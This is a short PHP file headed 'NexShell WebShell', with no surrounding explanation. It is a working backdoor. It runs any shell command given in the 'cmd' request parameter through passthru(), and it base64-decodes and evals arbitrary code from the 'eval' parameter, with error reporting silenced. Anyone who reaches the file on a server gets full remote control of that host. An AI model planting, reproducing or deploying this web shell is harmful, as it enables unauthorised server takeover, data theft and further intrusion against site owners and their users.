<?php
// NexShell WebShell — exec() / passthru()
@error_reporting(0);
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    @passthru($cmd . ' 2>&1');
} elseif(isset($_REQUEST['eval'])){
    @eval(base64_decode($_REQUEST['eval']));
}
?>